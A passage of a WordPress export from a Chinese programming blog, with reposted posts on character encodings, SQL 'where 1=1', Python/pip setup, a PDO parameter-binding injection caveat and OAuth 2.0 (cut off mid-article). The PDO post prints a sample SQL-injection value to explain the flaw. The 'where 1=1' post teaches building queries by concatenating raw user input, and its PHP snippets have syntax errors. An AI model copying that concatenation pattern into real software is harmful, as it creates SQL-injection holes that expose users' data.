			<wp:comment_content><![CDATA[这样的解释过于为了区别而区别了。https://zh.wikipedia.org/zh/%E5%93%8D%E5%BA%94%E5%BC%8F%E7%BD%91%E9%A1%B5%E8%AE%BE%E8%AE%A1]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>ASCII，Unicode和UTF-8的关系</title>
		<link>http://wp.veitor.net/2014/11/06/ascii-unicode%e5%92%8cutf-8%e7%9a%84%e5%85%b3%e7%b3%bb/</link>
		<pubDate>Thu, 06 Nov 2014 09:06:59 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=382</guid>
		<description></description>
		<content:encoded><![CDATA[这个笔记主要用来整理自己的思路。但是，尽量试图写得通俗易懂，希望能对其他朋友有用。毕竟，字符编码是计算机技术的基石，想要熟练使用计算机，就必须懂得一点字符编码的知识。
<strong>1. ASCII码</strong>
我们知道，在计算机内部，所有的信息最终都表示为一个二进制的字符串。每一个二进制位（bit）有0和1两种状态，因此八个二进制位就可以组合出 256种状态，这被称为一个字节（byte）。也就是说，一个字节一共可以用来表示256种不同的状态，每一个状态对应一个符号，就是256个符号，从 0000000到11111111。
上个世纪60年代，美国制定了一套字符编码，对英语字符与二进制位之间的关系，做了统一规定。这被称为ASCII码，一直沿用至今。
ASCII码一共规定了128个字符的编码，比如空格"SPACE"是32（二进制00100000），大写的字母A是65（二进制01000001）。这128个符号（包括32个不能打印出来的控制符号），只占用了一个字节的后面7位，最前面的1位统一规定为0。
<strong>2、非ASCII编码</strong>
英语用128个符号编码就够了，但是用来表示其他语言，128个符号是不够的。比如，在法语中，字母上方有注音符号，它就无法用ASCII码表示。 于是，一些欧洲国家就决定，利用字节中闲置的最高位编入新的符号。比如，法语中的é的编码为130（二进制10000010）。这样一来，这些欧洲国家使 用的编码体系，可以表示最多256个符号。
但是，这里又出现了新的问题。不同的国家有不同的字母，因此，哪怕它们都使用256个符号的编码方式，代表的字母却不一样。比如，130在法语编码 中代表了é，在希伯来语编码中却代表了字母Gimel (ג)，在俄语编码中又会代表另一个符号。但是不管怎样，所有这些编码方式中，0--127表示的符号是一样的，不一样的只是128--255的这一段。
至于亚洲国家的文字，使用的符号就更多了，汉字就多达10万左右。一个字节只能表示256种符号，肯定是不够的，就必须使用多个字节表达一个符号。 比如，简体中文常见的编码方式是GB2312，使用两个字节表示一个汉字，所以理论上最多可以表示256x256=65536个符号。
中文编码的问题需要专文讨论，这篇笔记不涉及。这里只指出，虽然都是用多个字节表示一个符号，但是GB类的汉字编码与后文的Unicode和UTF-8是毫无关系的。
<strong>3.Unicode</strong>
正如上一节所说，世界上存在着多种编码方式，同一个二进制数字可以被解释成不同的符号。因此，要想打开一个文本文件，就必须知道它的编码方式，否则用错误的编码方式解读，就会出现乱码。为什么电子邮件常常出现乱码？就是因为发信人和收信人使用的编码方式不一样。
可以想象，如果有一种编码，将世界上所有的符号都纳入其中。每一个符号都给予一个独一无二的编码，那么乱码问题就会消失。这就是Unicode，就像它的名字都表示的，这是一种所有符号的编码。
Unicode当然是一个很大的集合，现在的规模可以容纳100多万个符号。每个符号的编码都不一样，比如，U+0639表示阿拉伯字母Ain，U+0041表示英语的大写字母A，U+4E25表示汉字"严"。具体的符号对应表，可以查询<a href="http://www.unicode.org" target="_blank" rel="noopener noreferrer">unicode.org</a>，或者专门的<a href="http://www.chi2ko.com/tool/CJK.htm" target="_blank" rel="noopener noreferrer">汉字对应表</a>。
<strong>4. Unicode的问题</strong>
需要注意的是，Unicode只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储。
比如，汉字"严"的unicode是十六进制数4E25，转换成二进制数足足有15位（100111000100101），也就是说这个符号的表示至少需要2个字节。表示其他更大的符号，可能需要3个字节或者4个字节，甚至更多。
这里就有两个严重的问题，第一个问题是，如何才能区别Unicode和ASCII？计算机怎么知道三个字节表示一个符号，而不是分别表示三个符号 呢？第二个问题是，我们已经知道，英文字母只用一个字节表示就够了，如果Unicode统一规定，每个符号用三个或四个字节表示，那么每个英文字母前都必 然有二到三个字节是0，这对于存储来说是极大的浪费，文本文件的大小会因此大出二三倍，这是无法接受的。
它们造成的结果是：1）出现了Unicode的多种存储方式，也就是说有许多种不同的二进制格式，可以用来表示Unicode。2）Unicode在很长一段时间内无法推广，直到互联网的出现。
<strong>5.UTF-8</strong>
互联网的普及，强烈要求出现一种统一的编码方式。UTF-8就是在互联网上使用最广的一种Unicode的实现方式。其他实现方式还包括UTF-16（字符用两个字节或四个字节表示）和UTF-32（字符用四个字节表示），不过在互联网上基本不用。<strong>重复一遍，这里的关系是，UTF-8是Unicode的实现方式之一。</strong>
UTF-8最大的一个特点，就是它是一种变长的编码方式。它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。
UTF-8的编码规则很简单，只有二条：
1）对于单字节的符号，字节的第一位设为0，后面7位为这个符号的unicode码。因此对于英语字母，UTF-8编码和ASCII码是相同的。
2）对于n字节的符号（n&gt;1），第一个字节的前n位都设为1，第n+1位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的unicode码。
下表总结了编码规则，字母x表示可用编码的位。
<blockquote>
<div>
Unicode符号范围 | UTF-8编码方式
(十六进制) | （二进制）
--------------------+---------------------------------------------
0000 0000-0000 007F | 0xxxxxxx
0000 0080-0000 07FF | 110xxxxx 10xxxxxx
0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx
0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx
</div></blockquote>
跟据上表，解读UTF-8编码非常简单。如果一个字节的第一位是0，则这个字节单独就是一个字符；如果第一位是1，则连续有多少个1，就表示当前字符占用多少个字节。
下面，还是以汉字"严"为例，演示如何实现UTF-8编码。
已知"严"的unicode是4E25（100111000100101），根据上表，可以发现4E25处在第三行的范围内（0000 0800-0000 FFFF），因此"严"的UTF-8编码需要三个字节，即格式是"1110xxxx 10xxxxxx 10xxxxxx"。然后，从"严"的最后一个二进制位开始，依次从后向前填入格式中的x，多出的位补0。这样就得到了，"严"的UTF-8编码 是"11100100 10111000 10100101"，转换成十六进制就是E4B8A5。
<strong>6. Unicode与UTF-8之间的转换</strong>
通过上一节的例子，可以看到"严"的Unicode码是4E25，UTF-8编码是E4B8A5，两者是不一样的。它们之间的转换可以通过程序实现。
在Windows平台下，有一个最简单的转化方法，就是使用内置的记事本小程序Notepad.exe。打开文件后，点击"文件"菜单中的"另存为"命令，会跳出一个对话框，在最底部有一个"编码"的下拉条。
<a href="http://storage.veitor.net/uploads/2014/11/QQ截图20141106170522.jpg"><img class="aligncenter size-full wp-image-383" alt="QQ截图20141106170522" src="http://storage.veitor.net/uploads/2014/11/QQ截图20141106170522.jpg" width="497" height="223" /></a>
里面有四个选项：ANSI，Unicode，Unicode big endian 和 UTF-8。
1）ANSI是默认的编码方式。对于英文文件是ASCII编码，对于简体中文文件是GB2312编码（只针对Windows简体中文版，如果是繁体中文版会采用Big5码）。
2）Unicode编码指的是UCS-2编码方式，即直接用两个字节存入字符的Unicode码。这个选项用的little endian格式。
3）Unicode big endian编码与上一个选项相对应。我在下一节会解释little endian和big endian的涵义。
4）UTF-8编码，也就是上一节谈到的编码方法。
选择完"编码方式"后，点击"保存"按钮，文件的编码方式就立刻转换好了。
<strong>7. Little endian和Big endian</strong>
上一节已经提到，Unicode码可以采用UCS-2格式直接存储。以汉字"严"为例，Unicode码是4E25，需要用两个字节存储，一个字节 是4E，另一个字节是25。存储的时候，4E在前，25在后，就是Big endian方式；25在前，4E在后，就是Little endian方式。
这两个古怪的名称来自英国作家斯威夫特的《格列佛游记》。在该书中，小人国里爆发了内战，战争起因是人们争论，吃鸡蛋时究竟是从大头(Big- Endian)敲开还是从小头(Little-Endian)敲开。为了这件事情，前后爆发了六次战争，一个皇帝送了命，另一个皇帝丢了王位。
因此，第一个字节在前，就是"大头方式"（Big endian），第二个字节在前就是"小头方式"（Little endian）。
那么很自然的，就会出现一个问题：计算机怎么知道某一个文件到底采用哪一种方式编码？
Unicode规范中定义，每一个文件的最前面分别加入一个表示编码顺序的字符，这个字符的名字叫做"零宽度非换行空格"（ZERO WIDTH NO-BREAK SPACE），用FEFF表示。这正好是两个字节，而且FF比FE大1。
如果一个文本文件的头两个字节是FE FF，就表示该文件采用大头方式；如果头两个字节是FF FE，就表示该文件采用小头方式。
<strong>8. 实例</strong>
下面，举一个实例。
打开"记事本"程序Notepad.exe，新建一个文本文件，内容就是一个"严"字，依次采用ANSI，Unicode，Unicode big endian 和 UTF-8编码方式保存。
然后，用文本编辑软件<a href="http://www.google.cn/search?aq=t&amp;oq=UltraEdit&amp;complete=1&amp;hl=zh-CN&amp;newwindow=1&amp;rlz=1B3GGGL_zh-CNCN216CN216&amp;q=ultraedit+%E4%B8%8B%E8%BD%BD&amp;btnG=Google+%E6%90%9C%E7%B4%A2&amp;meta=" target="_blank" rel="noopener noreferrer">UltraEdit中</a>的"十六进制功能"，观察该文件的内部编码方式。
1）ANSI：文件的编码就是两个字节"D1 CF"，这正是"严"的GB2312编码，这也暗示GB2312是采用大头方式存储的。
2）Unicode：编码是四个字节"FF FE 25 4E"，其中"FF FE"表明是小头方式存储，真正的编码是4E25。
3）Unicode big endian：编码是四个字节"FE FF 4E 25"，其中"FE FF"表明是大头方式存储。
4）UTF-8：编码是六个字节"EF BB BF E4 B8 A5"，前三个字节"EF BB BF"表示这是UTF-8编码，后三个"E4B8A5"就是"严"的具体编码，它的存储顺序与编码顺序是一致的。
<strong>9. 延伸阅读</strong>
* <a href="http://www.joelonsoftware.com/articles/Unicode.html" target="_blank" rel="noopener noreferrer">The Absolute Minimum Every Software Developer Absolutely, Positively Must Know About Unicode and Character Sets</a>（关于字符集的最基本知识）
* <a href="http://www.pconline.com.cn/pcedu/empolder/gj/other/0505/616631.html" target="_blank" rel="noopener noreferrer">谈谈Unicode编码</a>
* <a href="http://www.ietf.org/rfc/rfc3629.txt" target="_blank" rel="noopener noreferrer">RFC3629：UTF-8, a transformation format of ISO 10646</a>（如果实现UTF-8的规定）
（完）
&nbsp;
原文地址：http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>382</wp:post_id>
		<wp:post_date><![CDATA[2014-11-06 09:06:59]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-11-06 09:06:59]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[ascii-unicode%e5%92%8cutf-8%e7%9a%84%e5%85%b3%e7%b3%bb]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="ascii"><![CDATA[ASCII]]></category>
		<category domain="post_tag" nicename="unicode"><![CDATA[unicode]]></category>
		<category domain="post_tag" nicename="utf-8"><![CDATA[UTF-8]]></category>
		<category domain="post_tag" nicename="%e7%bc%96%e7%a0%81"><![CDATA[编码]]></category>
		<category domain="category" nicename="xitong"><![CDATA[计算机系统]]></category>
		<category domain="post_tag" nicename="%e8%bd%ac%e8%bd%bd"><![CDATA[转载]]></category>
						</item>
					<item>
		<title>sql中where 1=1和 0=1 的作用</title>
		<link>http://wp.veitor.net/2014/11/10/sql%e4%b8%adwhere-11%e5%92%8c-01-%e7%9a%84%e4%bd%9c%e7%94%a8/</link>
		<pubDate>Mon, 10 Nov 2014 02:36:09 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=385</guid>
		<description></description>
		<content:encoded><![CDATA[刚在写sql的时候思考了一下在不确定条件因素时的情况，之前看到别人使用过where 1=1这个条件， 这个条件始终为True，后来了解到在不定数量查询条件情况下，1=1可以很方便的规范语句。
<h2>一、不用where <wbr /> 1=1 <wbr /> 在多条件查询中的困扰</h2>
<div id="cnblogs_post_body">
　　举个例子，如果您做查询页面，并且，可查询的选项有多个，同时，还让用户自行选择并输入查询关键词，那么，按平时的查询语句的动态构造，代码大体如下：
<pre class="lang:php decode:true">$sql=”select * from table where”；
if(!empty($age))
{
    $sql .= 'age='.$age'；
}
if(!empty($address))
{
　　$sql. = 'and address='.$address;
}</pre>
如果上述的两个if判断语句，均为true，即用户都输入了查询词，那么，最终的$sql动态构造语句变为：
$sql= 'select * from table where age=20 and address="常州"';
可以看得出来，这是一条完整的正确的SQL查询语句，能够正确的被执行，并根据数据库是否存在记录，返回数据。
②种假设
如果上述的两个if判断语句不成立，那么，最终的$sql动态构造语句变为：
$sql  = 'select * from table where';
现在，我们来看一下这条语句，由于where关键词后面需要使用条件，但是这条语句根本就不存在条件，所以，该语句就是一条错误的语句，肯定不能被执行，不仅报错，同时还不会查询到任何数据。
上述的两种假设，代表了现实的应用，说明，语句的构造存在问题，不足以应付灵活多变的查询条件。
<h2>二、使用 where <wbr /> 1=1 <wbr /> 的好处</h2>
假如我们将上述的语句改为：
<pre class="lang:php decode:true ">$sql=”select * from table where 1=1”；
if(!empty($age))
{
    $sql .= ' and age='.$age'；
}
if(!empty($address))
{
　　$sql. = 'and address='.$address;
}</pre>
①种假设
如果两个if都成立，那么，语句变为：
$sql = 'select * from table where 1=1 and age=12 and address="常州'"，很明显，该语句是一条正确的语句，能够正确执行，如果数据库有记录，肯定会被查询到。
②种假设
如果两个if都不成立，那么，语句变为：
$sql = 'select * from table where 1=1'，现在，我们来看这条语句，由于where 1=1 是为true的语句，因此，该条语句语法正确，能够被正确执行，它的作用相当于：$sql = 'select * from table'，即返回表中所有数据。
言下之意就是：如果用户在多条件查询页面中，不选择任何字段、不输入任何关键词，那么，必将返回表中所有数据；如果用户在页面中，选择了部分字段并且输入了部分查询关键词，那么，就按用户设置的条件进行查询。
说到这里，不知道您是否已明白，其实，where 1=1的应用，不是什么高级的应用，也不是所谓的智能化的构造，仅仅只是为了满足多条件查询页面中不确定的各种因素而采用的一种构造一条正确能运行的动态SQL语句的一种方法。
where 1=0; 这个条件始终为false，结果不会返回任何数据，只有表结构，可用于快速建表
"select * from table where 1=0"; 该select语句主要用于读取表的结构而不考虑表中的数据，这样节省了内存，因为可以不用保存结果集。
create table newtable as select * from oldtable where 1=0;  创建一个新表，而新表的结构与查询的表的结构是一样的。
</div>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>385</wp:post_id>
		<wp:post_date><![CDATA[2014-11-10 02:36:09]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-11-10 02:36:09]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[sql%e4%b8%adwhere-11%e5%92%8c-01-%e7%9a%84%e4%bd%9c%e7%94%a8]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mysql-2"><![CDATA[Mysql]]></category>
		<category domain="post_tag" nicename="mysql"><![CDATA[mysql]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>Windows下安装python和pip</title>
		<link>http://wp.veitor.net/2014/11/18/windows%e4%b8%8b%e5%ae%89%e8%a3%85python%e5%92%8cpip/</link>
		<pubDate>Tue, 18 Nov 2014 08:11:43 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=389</guid>
		<description></description>
		<content:encoded><![CDATA[此前安装过python，但因为安装pip过程中遇到了问题，所以把python也一起卸载了。现在重新安装一下这两个。
这里选择了python2.7.8版本进行安装，因为我需要使用sqlmap这个工具，而这个工具对python版本有要求，最新版本的python会出错，所以我选择了2.7.8的版本。
首先上官网https://www.python.org/downloads 下载
<p style="text-align: center;"><a href="http://storage.veitor.net/uploads/2014/11/QQ截图20141118141425.jpg" target="_blank" rel="noopener noreferrer"><img class="aligncenter  wp-image-391" alt="QQ截图20141118141425" src="http://storage.veitor.net/uploads/2014/11/QQ截图20141118141425.jpg" width="962" height="388" /></a></p>
下载的是msi文件，直接打开像安装普通软件一样安装就行。<span style="color: #ff0000;"><strong>但有一点一定要注意，如果你要使用pip，则安装python时选择的安装路径目录中不要有空格，如果安装到了Program Files这样的目录下，那么接下来安装的pip将无法正常运行，会报错。</strong></span>所以这里我直接选择了D盘下，安装前记得选择将python.exe添加到系统环境变量。
<a href="http://storage.veitor.net/uploads/2014/11/QQ图片20141118142038.jpg"><img class="aligncenter size-full wp-image-392" alt="QQ图片20141118142038" src="http://storage.veitor.net/uploads/2014/11/QQ图片20141118142038.jpg" width="646" height="431" /></a>
&nbsp;
安装完之后在CMD中输入python命令会看到欢迎界面。
接下来安装pip，上https://pip.pypa.io/en/latest/installing.html下载 get-pip.py脚本
在CMD下找到该文件目录并运行下列命令（需要管理员权限）：
<span class="lang:python decode:true  crayon-inline ">python get-pip.py</span>
<a href="http://storage.veitor.net/uploads/2014/11/QQ截图20141118142644.jpg"><img class="aligncenter size-full wp-image-393" alt="QQ截图20141118142644" src="http://storage.veitor.net/uploads/2014/11/QQ截图20141118142644.jpg" width="677" height="392" /></a>
安装好之后，会发现python安装目录下会多出一个Scripts目录（若之前没有）。
这时我们直接在命令行输入pip，会显示‘pip’不是内部命令，也不是可运行的程序。因为我们还没有添加环境变量。
只要在PATH变量中添加：D:\Python27\Scripts;（路径自己更换）就好了，输入<span class="lang:sh decode:true  crayon-inline ">pip list</span> 查看安装情况
<a href="http://storage.veitor.net/uploads/2014/11/QQ截图20141118143306.jpg"><img class="aligncenter size-full wp-image-394" alt="QQ截图20141118143306" src="http://storage.veitor.net/uploads/2014/11/QQ截图20141118143306.jpg" width="677" height="392" /></a>
&nbsp;
如果出现下列错误，那么原因可能就是上面我所说的python安装路径目录名中有空格了
&nbsp;
<pre class="lang:sh decode:true ">Fatal error in launcher: Unable to create process using '"D:\Program Files\Python27\python.exe" "D:\Program Files\Python27\Scripts\pip.exe" '</pre>
&nbsp;
（完）]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>389</wp:post_id>
		<wp:post_date><![CDATA[2014-11-18 08:11:43]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-11-18 08:11:43]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[windows%e4%b8%8b%e5%ae%89%e8%a3%85python%e5%92%8cpip]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="pip"><![CDATA[pip]]></category>
		<category domain="post_tag" nicename="python"><![CDATA[python]]></category>
		<category domain="category" nicename="bianchengyuyan"><![CDATA[编程语言]]></category>
						</item>
					<item>
		<title>PHP 5.3.6及以前版本的PDO的bindParam,bindValue潜在的安全隐患</title>
		<link>http://wp.veitor.net/2014/11/20/php-5-3-6%e5%8f%8a%e4%bb%a5%e5%89%8d%e7%89%88%e6%9c%ac%e7%9a%84pdo%e7%9a%84bindparambindvalue%e6%bd%9c%e5%9c%a8%e7%9a%84%e5%ae%89%e5%85%a8%e9%9a%90%e6%82%a3/</link>
		<pubDate>Thu, 20 Nov 2014 02:03:42 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=396</guid>
		<description></description>
		<content:encoded><![CDATA[PHP 5.3.6及以前版本的PDO的bindParam,bindValue潜在的安全隐患
使用PDO的参数化查询时，可以使用bindParam,bindValue为占位符绑定相应的参数或变量， 我们往往使用如下格式：
$statement-&gt;bindParam(1, $string);
$statement-&gt;bindParam(2, $int, PDO::PARAM_INT);
我在以前的文章中分析介绍过PDO的ATTR_EMULATE_PREPARES属性对PDO底层协议与MySQL Server通讯机制影响：
1. 默认情况下，PDO会使用DSN中指定的字符集对输入参数进行本地转义（PHP手册中称为native prepared statements），然后拼接成完整的SQL语句，发送给MySQL Server。这有些像我们平时程序中拼接变量到SQL再执行查询的形式。
这种情况下，PDO驱动能否正确转义输入参数，是拦截SQL注入的关键。然而PHP 5.3.6及老版本，并不支持在DSN中定义charset属性（会忽略之），这时如果使用PDO的本地转义，仍然可能导致SQL注入，解决办法后面会提到。
2. MySQL Server 5.1开始支持prepare预编译SQL机制，即SQL查询语句与参数分离提交，但这个特性需要客户端协议支持支持，目前所有版本的PHP均支持。
如果PDO客户端使用mysql Server的prepare功能，大致的交互过程是：
A. PDO将SQL模板发送给mysql server， SQL模板即包含参数占位符（问号或命名参数）的SQL语句
B. PDO不对输入参数作任何转义处理，将参数的位置，值，类型等等信息发送给MySQL Server
C. PDO客户端调用execute statement
D. MySQL Server 对B步骤提交的参数进行内部转义，并执行查询,返回结果给客户端。
看到没有，如果使用了mysql server prepare功能，则字符串的转义是由MySQL Server完成的。mysql会根据字符集（set names &lt;charset&gt;）对输入参数转换，确保没有注入产生。
&nbsp;
PDO默认情况下使用了本地模拟prepare（并未使用MySQL server的prepare）,如果要禁止PDO本地模拟行为而使用MySQL Server的prepare机制，则需要设置PDO的参数：
$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES,false);
如果你使用了PHP 5.3.6及以前版本，强烈推荐使用上述语句加强安全性。
如果你使用PHP 5.3.6+, 则请在DSN中指定 charset，是否设置上述参数，都是安全的。
&nbsp;
好了，现在步入正题，假设有以下代码逻辑：
&nbsp;
$pdo = new PDO("mysql:host=localhost;dbname=test;charset=utf8",'root','');
$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);
$pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE,PDO::FETCH_ASSOC);
$pdo-&gt;exec('set names utf8');
$id = '0 or 1 =1 order by id desc';
$sql = "select * from article where id = ?";
$statement = $pdo-&gt;prepare($sql);
$statement-&gt;bindParam(1, $id, PDO::PARAM_INT);
$statement-&gt;execute();
假设$id是外部变量（由其它函数传递，或用户提交），我们也没有使用intval对这两个参数进行强制类型转换（我们认为使用PDO绑定参数时已经指定参数类型为INT, 即PDO::PARAM_INT），期待PDO能使用我们指定的类型对其进行转义，但是事实上呢？却有太多不确定因素：
1. 以上代码实测在PHP 5.2.1造成了SQL注入
2. 以上代码在PHP 5.3.9下，没有造成任何SQL注入
那么，如果使用了存在bug的PHP版本，那么如何从根本上解决这个问题？
1. 设置PDO不使用本地模拟prepare, 即 $pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES,false);
&nbsp;
这样，即使不使用intval对输入进行转换，也可以确保是安全的。如果由于程序员遗忘没有使用intval转换，那么还是存在安全隐患的。
&nbsp;
使用这种方式，更彻底，更安全。
原文地址：http://zhangxugg-163-com.iteye.com/blog/1855088]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>396</wp:post_id>
		<wp:post_date><![CDATA[2014-11-20 02:03:42]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-11-20 02:03:42]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[php-5-3-6%e5%8f%8a%e4%bb%a5%e5%89%8d%e7%89%88%e6%9c%ac%e7%9a%84pdo%e7%9a%84bindparambindvalue%e6%bd%9c%e5%9c%a8%e7%9a%84%e5%ae%89%e5%85%a8%e9%9a%90%e6%82%a3]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mysql-2"><![CDATA[Mysql]]></category>
		<category domain="post_tag" nicename="mysql"><![CDATA[mysql]]></category>
		<category domain="post_tag" nicename="%e8%bd%ac%e8%bd%bd"><![CDATA[转载]]></category>
						</item>
					<item>
		<title>OAuth2.0认证和授权原理</title>
		<link>http://wp.veitor.net/2014/11/26/oauth2-0%e8%ae%a4%e8%af%81%e5%92%8c%e6%8e%88%e6%9d%83%e5%8e%9f%e7%90%86/</link>
		<pubDate>Wed, 26 Nov 2014 07:09:32 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=399</guid>
		<description></description>
		<content:encoded><![CDATA[以前做过一个人人网的站内应用（http://apps.renren.com/rr_timer不过已经很久没更新了），其中就用到了OAtuth授权，今天要做个新浪微博授权登陆，那么正巧再复习一下OAuth认证和授权原理吧，也没多少时间写这玩意儿，网上之前看到一篇不错的就拉过来了。
<a href="http://en.wikipedia.org/wiki/OAuth" target="_blank" rel="noopener noreferrer">OAuth</a>是一个关于授权（authorization）的开放网络标准，在全世界得到广泛应用，目前的版本是2.0版。
本文对OAuth 2.0的设计思路和运行流程，做一个简明通俗的解释，主要参考材料为<a href="http://www.rfcreader.com/#rfc6749" target="_blank" rel="noopener noreferrer">RFC 6749</a>。
<img class="wp-image-400" alt="bg2014051201" src="http://storage.veitor.net/uploads/2014/11/bg2014051201.png" width="210" height="209" />
<h2>一、应用场景</h2>
为了理解OAuth的适用场合，让我举一个假设的例子。
有一个"云冲印"的网站，可以将用户储存在Google的照片，冲印出来。用户为了使用该服务，必须让"云冲印"读取自己储存在Google上的照片。
问题是只有得到用户的授权，Google才会同意"云冲印"读取这些照片。那么，"云冲印"怎样获得用户的授权呢？
传统方法是，用户将自己的Google用户名和密码，告诉"云冲印"，后者就可以读取用户的照片了。这样的做法有以下几个严重的缺点。
<blockquote>（1）"云冲印"为了后续的服务，会保存用户的密码，这样很不安全。
（2）Google不得不部署密码登录，而我们知道，单纯的密码登录并不安全。
（3）"云冲印"拥有了获取用户储存在Google所有资料的权力，用户没法限制"云冲印"获得授权的范围和有效期。
（4）用户只有修改密码，才能收回赋予"云冲印"的权力。但是这样做，会使得其他所有获得用户授权的第三方应用程序全部失效。
（5）只要有一个第三方应用程序被破解，就会导致用户密码泄漏，以及所有被密码保护的数据泄漏。</blockquote>
OAuth就是为了解决上面这些问题而诞生的。
<h2>二、名词定义</h2>
在详细讲解OAuth 2.0之前，需要了解几个专用名词。它们对读懂后面的讲解，尤其是几张图，至关重要。
<blockquote>（1） Third-party application：第三方应用程序，本文中又称"客户端"（client），即上一节例子中的"云冲印"。
（2）HTTP service：HTTP服务提供商，本文中简称"服务提供商"，即上一节例子中的Google。
（3）Resource Owner：资源所有者，本文中又称"用户"（user）。
（4）User Agent：用户代理，本文中就是指浏览器。
（5）Authorization server：认证服务器，即服务提供商专门用来处理认证的服务器。
（6）Resource server：资源服务器，即服务提供商存放用户生成的资源的服务器。它与认证服务器，可以是同一台服务器，也可以是不同的服务器。</blockquote>
知道了上面这些名词，就不难理解，OAuth的作用就是让"客户端"安全可控地获取"用户"的授权，与"服务商提供商"进行互动。
<h2>三、OAuth的思路</h2>
OAuth在"客户端"与"服务提供商"之间，设置了一个授权层（authorization layer）。"客户端"不能直接登录"服务提供商"，只能登录授权层，以此将用户与客户端区分开来。"客户端"登录授权层所用的令牌（token），与用户的密码不同。用户可以在登录的时候，指定授权层令牌的权限范围和有效期。
"客户端"登录授权层以后，"服务提供商"根据令牌的权限范围和有效期，向"客户端"开放用户储存的资料。
<h2>四、运行流程</h2>
OAuth 2.0的运行流程如下图，摘自RFC 6749。
<a href="http://storage.veitor.net/uploads/2014/11/bg2014051203.png"><img class="aligncenter size-full wp-image-402" alt="bg2014051203" src="http://storage.veitor.net/uploads/2014/11/bg2014051203.png" width="766" height="411" /></a>
&nbsp;
<blockquote>（A）用户打开客户端以后，客户端要求用户给予授权。
（B）用户同意给予客户端授权。
（C）客户端使用上一步获得的授权，向认证服务器申请令牌。
（D）认证服务器对客户端进行认证以后，确认无误，同意发放令牌。
（E）客户端使用令牌，向资源服务器申请获取资源。
（F）资源服务器确认令牌无误，同意向客户端开放资源。</blockquote>
不难看出来，上面六个步骤之中，B是关键，即用户怎样才能给于客户端授权。有了这个授权以后，客户端就可以获取令牌，进而凭令牌获取资源。
下面一一讲解客户端获取授权的四种模式。
<h2>五、客户端的授权模式</h2>
客户端必须得到用户的授权（authorization grant），才能获得令牌（access token）。OAuth 2.0定义了四种授权方式。
<ul>
	<li>授权码模式（authorization code）</li>
	<li>简化模式（implicit）</li>
	<li>密码模式（resource owner password credentials）</li>
	<li>客户端模式（client credentials）</li>
</ul>
<h2>六、授权码模式</h2>
